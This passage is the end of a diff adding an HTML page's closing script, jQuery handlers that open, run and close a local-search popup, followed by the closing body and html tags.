+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
